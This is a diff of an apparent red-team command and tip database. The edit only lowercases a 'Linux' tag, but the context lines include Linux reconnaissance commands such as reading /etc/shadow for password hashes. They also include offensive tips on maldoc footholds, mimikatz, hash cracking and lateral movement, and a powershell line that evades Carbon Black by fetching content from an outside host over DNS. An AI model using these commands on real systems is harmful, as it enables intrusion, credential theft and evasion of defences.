@@ -245,131 +245,131 @@
     ),
     #Linux
     %(cmd => 'cat /etc/issue', desc => 'Verify Linux distro', tags => @(
-        'Linux', 'etc', 'issue', 'cat', 'distro'
+        'linux', 'etc', 'issue', 'cat', 'distro'
         )
     ),
     %(cmd => 'cat /etc/*-release', desc => 'Verify exact version and distribution for Linux', tags => @(
-        'Linux', 'cat', 'etc', 'release', 'version', 'distro'
+        'linux', 'cat', 'etc', 'release', 'version', 'distro'
         )
     ),
     %(cmd => 'cat /etc/*-release | grep -E \'\"NAME=\"|ID|VERSION|ID_LIKE\'', desc => 'Verify exact version and distribution for Linux', tags => @(
-        'Linux', 'cat', 'etc', 'release', 'version', 'distro'
+        'linux', 'cat', 'etc', 'release', 'version', 'distro'
         )
     ),
     %(cmd => 'cat /proc/version', desc => 'Verify Linux version using proc', tags => @(
-        'Linux', 'cat', 'proc', 'version', 'distro'
+        'linux', 'cat', 'proc', 'version', 'distro'
         )
     ),
     %(cmd => 'rpm -q kernel', desc => 'Get detailed information about the kernel', tags => @(
-        'Linux', 'rpm', 'kernel'
+        'linux', 'rpm', 'kernel'
         )
     ),
     %(cmd => 'dmesg | grep Linux', desc => 'Output kernel messages for Linux', tags => @(
-        'Linux', 'dmesg', 'grep', 'kernel'
+        'linux', 'dmesg', 'grep', 'kernel'
         )
     ),
     %(cmd => 'ls /boot | grep vmlinuz-', desc => 'Verify the name of the specific version of the kernel', tags => @(
-        'Linux', 'ls', 'grep', 'vmlinuz-', 'kernel'
+        'linux', 'ls', 'grep', 'vmlinuz-', 'kernel'
         )
     ),
     %(cmd => 'lsb_release -a', desc => 'Display information about your specific Linux distrobution', tags => @(
-        'Linux', 'lsb_release', 'LSB', 'distro'
+        'linux', 'lsb_release', 'LSB', 'distro'
         )
     ),
     %(cmd => 'last -a', desc => 'Show the users who logged in last', tags => @(
-        'Linux', 'last', 'login', 'log'
+        'linux', 'last', 'login', 'log'
         )
     ),
     %(cmd => 'uname -a/-mrs', desc => 'Display the software and hardware information in current running Linux system', tags => @(
-        'Linux', 'uname', 'software', 'hardware', 'system'
+        'linux', 'uname', 'software', 'hardware', 'system'
         )
     ),
     %(cmd => 'id', desc => 'Print user and group information for the specified USERNAME, or (when USERNAME omitted) for the current user', tags => @(
-        'Linux', 'id', 'user', 'group', 'username'
+        'linux', 'id', 'user', 'group', 'username'
         )
     ),
     %(cmd => 'history', desc => 'Show the last commands entered for the current user', tags => @(
-        'Linux', 'history', 'last', 'commands', 'user'
+        'linux', 'history', 'last', 'commands', 'user'
         )
     ),
     %(cmd => 'arp -a', desc => 'Display the current arp table', tags => @(
-        'Linux', 'arp', 'table', 'MAC'
+        'linux', 'arp', 'table', 'MAC'
         )
     ),
     %(cmd => 'netstat -anot', desc => 'Display network connections', tags => @(
-        'Linux', 'net', 'stat', 'TCP', 'UDP', 'connections'
+        'linux', 'net', 'stat', 'TCP', 'UDP', 'connections'
         )
     ),
     %(cmd => 'ps -elf', desc => 'View information on a selection of running processes', tags => @(
-        'Linux', 'ps', 'elf', 'processes', 'monitor', 'status'
+        'linux', 'ps', 'elf', 'processes', 'monitor', 'status'
         )
     ),
     %(cmd => 'ps -elf | grep root', desc => 'View information on a selection of running processes owned by root', tags => @(
-        'Linux', 'ps', 'elf', 'root', 'processes', 'monitor'
+        'linux', 'ps', 'elf', 'root', 'processes', 'monitor'
         )
     ),
     %(cmd => 'ls -la /var/www/html/', desc => 'List the contents of html directory for web resources', tags => @(
-        'Linux', 'ls', '/var/www/html', 'web', 'html', 'listing'
+        'linux', 'ls', '/var/www/html', 'web', 'html', 'listing'
         )
     ),
     %(cmd => 'service apache2 status', desc => 'View status of apache2 service', tags => @(
-        'Linux', 'apache2', 'service', 'status', 'web'
+        'linux', 'apache2', 'service', 'status', 'web'
         )
     ),
     %(cmd => 'cat /etc/resolv.conf', desc => 'View the DNS entries for your Linux distro', tags => @(
-        'Linux', 'cat', 'etc', 'resolv.conf', 'DNS', 'distro'
+        'linux', 'cat', 'etc', 'resolv.conf', 'DNS', 'distro'
         )
     ),
     %(cmd => 'cat /etc/networks', desc => 'View Linux network configuration', tags => @(
-        'Linux', 'cat', 'etc', 'networks', 'config'
+        'linux', 'cat', 'etc', 'networks', 'config'
         )
     ),
     %(cmd => 'iptables -L', desc => 'Display all iptables rules', tags => @(
-        'Linux', 'iptables', 'networking', 'rules', 'ACL'
+        'linux', 'iptables', 'networking', 'rules', 'ACL'
         )
     ),
     %(cmd => 'iptables -L -t nat', desc => 'Display all natting iptables rules', tags => @(
-        'Linux', 'iptables', 'nat', 'rules', 'ACL'
+        'linux', 'iptables', 'nat', 'rules', 'ACL'
         )
     ),
     %(cmd => 'lsof -i', desc => 'List the files that are open by which process', tags => @(
-        'Linux', 'lsof', 'list', 'files', 'process', 'open'
+        'linux', 'lsof', 'list', 'files', 'process', 'open'
         )
     ),
     %(cmd => 'cat /etc/services', desc => 'View services that client applications use', tags => @(
-        'Linux', 'cat', 'etc', 'services', 'client', 'applications'
+        'linux', 'cat', 'etc', 'services', 'client', 'applications'
         )
     ),
     %(cmd => 'grep 80 /etc/services', desc => 'View services that utilize port 80', tags => @(
-        'Linux', 'grep', '80', 'web', 'services', 'port'
+        'linux', 'grep', '80', 'web', 'services', 'port'
         )
     ),
     %(cmd => 'w', desc => 'Display who is logged into the Linux and Unix-like server, and what they are doing at command execution time', tags => @(
-        'Linux', 'w', 'logged', 'login', 'command', 'execution'
+        'linux', 'w', 'logged', 'login', 'command', 'execution'
         )
     ),
     %(cmd => 'route -n', desc => 'Display the route table for Linux/Debian based systems', tags => @(
-        'Linux', 'route', '-n', 'routing', 'network', 'recon'
+        'linux', 'route', '-n', 'routing', 'network', 'recon'
         )
     ),
     %(cmd => 'cat /etc/passwd', desc => 'Display the contents of /etc/passwd', tags => @(
-        'Linux', 'cat', 'etc', 'passwd', 'password', 'recon'
+        'linux', 'cat', 'etc', 'passwd', 'password', 'recon'
         )
     ),
     %(cmd => 'cat /etc/passwd | awk -F : \'{if (\$3 > 999 && \$3 < 60001) print \$1,\$3,\$6}\'', desc => 'Display only users of /etc/passwd', tags => @(
-        'Linux', 'cat', 'etc', 'passwd', 'awk', 'regex', 'password', 'recon'
+        'linux', 'cat', 'etc', 'passwd', 'awk', 'regex', 'password', 'recon'
         )
     ),
     %(cmd => 'cat /etc/motd', desc => 'Display the message of the day for any sensitive info', tags => @(
-        'Linux', 'cat', 'etc', 'motd', 'information', 'recon'
+        'linux', 'cat', 'etc', 'motd', 'information', 'recon'
         )
     ),
     %(cmd => 'cat /etc/group', desc => 'Display the groups in /etc/group', tags => @(
-        'Linux', 'cat', 'etc', 'group', 'recon'
+        'linux', 'cat', 'etc', 'group', 'recon'
         )
     ),
     %(cmd => 'cat /etc/shadow', desc => 'Display the password hashes (Must be root)', tags => @(
-        'Linux', 'cat', 'etc', 'shadow', 'password', 'hashes', 'recon'
+        'linux', 'cat', 'etc', 'shadow', 'password', 'hashes', 'recon'
         )
     ),
 );
@@ -680,7 +680,7 @@
         )
     ),
     %(tips => 'Red tip #49: Attacking a heavy Macintosh or Linux estate? Send a Office Maldoc with OS checking logic to obtain footholds on either system', tags => @(
-        'redtip', '#49', 'Mac', 'Linux', 'Office', 'OS', 'foothold'
+        'redtip', '#49', 'Mac', 'linux', 'Office', 'OS', 'foothold'
         )
     ),
     %(tips => 'Red tip #50: Carbon Black checks for IEX and web req commands. Use powershell "powershell . (nslookup -q=txt calc.vincentyiu.co.uk )[-1]"', tags => @(
@@ -856,7 +856,7 @@
         )
     ),
     %(tips => 'Red tip #93: Use Empyre to generate Macintosh and Linux payloads, modify it to contain code for Windows too! https://github.com/EmpireProject/EmPyre', tags => @(
-        'redtip', '#93', 'Empire', 'MAC', 'Linux', 'payload', 'Empyre'
+        'redtip', '#93', 'Empire', 'MAC', 'linux', 'payload', 'Empyre'
         )
     ),
     %(tips => 'Red tip #94: Client uses VDIs? Compromise underlying host and use Citrix Shadow Taskbar to spy on VDI sessions by selecting username', tags => @(
@@ -1044,7 +1044,7 @@
         )
     ),
     %(tips => 'Red tip #141: On a Linux box and want to egress from it over a proxy? Use ProxyTunnel to pipe SSH - https://github.com/proxytunnel/proxytunnel', tags => @(
-        'redtip', '#141', 'Linux', 'egress', 'proxy', 'Tunnel', 'SSH'
+        'redtip', '#141', 'linux', 'egress', 'proxy', 'Tunnel', 'SSH'
         )
     ),
     %(tips => 'Red tip #142: Need some OSINT? Keep Spiderfoot running long term to accompany your manual OSINT sources http://www.spiderfoot.net', tags => @(
@@ -1088,7 +1088,7 @@
         )
     ),
     %(tips => 'Red tip #152: Want to scrape MetaData in CLI? Use PowerMeta. Linux users can use PowerShell too! https://github.com/dafthack/PowerMeta', tags => @(
-        'redtip', '#152', 'MetaData', 'CLI', 'Linux', 'PowerShell'
+        'redtip', '#152', 'MetaData', 'CLI', 'linux', 'PowerShell'
         )
     ),
     %(tips => 'Red tip #153: RDP in use? Dont want to use VNC? Try mimikatzs ts::multirdp in memory patch by @gentilkiwi', tags => @(
@@ -1216,7 +1216,7 @@
         )
     ),
     %(tips => 'Red tip #184: We always talk about Windows and AD. But now let’s have a look at Linux and AD with https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9', tags => @(
-        'redtip', '#184', 'Windows', 'AD', 'Linux'
+        'redtip', '#184', 'Windows', 'AD', 'linux'
         )
     ),
     %(tips => 'Red tip #185: Use WSUS for lateral movement https://github.com/AlsidOfficial/WSUSpendu/blob/master/WSUSpendu.ps1', tags => @(
@@ -1328,7 +1328,7 @@
         )
     ),
     %(tips => 'Red tip #212: Reset AD passwords from Linux with @mubix https://room362.com/post/2017/reset-ad-user-password-with-linux/ :) proxychains it over your pivot :D', tags => @(
-        'redtip', '#212', 'AD', 'password', 'Linux', 'proxychains', 'pivot'
+        'redtip', '#212', 'AD', 'password', 'linux', 'proxychains', 'pivot'
         )
     ),
     %(tips => 'Red tip #213: Got a NetNTLMv1 hash? Convert it to NTLM by cracking three DES keys: https://hashcat.net/forum/thread-5912.html', tags => @(
@@ -1376,7 +1376,7 @@
         )
     ),
     %(tips => 'Red tip #224: Using Linux? Modify /etc/dhcp/dhclient.conf and remove gethostname() for Opsec when you VPN or have to rock up on site.', tags => @(
-        'redtip', '#224', 'Linux', 'dhcp', 'opsec', 'VPN', 'site'
+        'redtip', '#224', 'linux', 'dhcp', 'opsec', 'VPN', 'site'
         )
     ),
     %(tips => 'Red tip #225: Stuck in a heavily segregated situation on a server? Try RDPInception attack vector out https://www.mdsec.co.uk/2017/06/rdpinception/', tags => @(
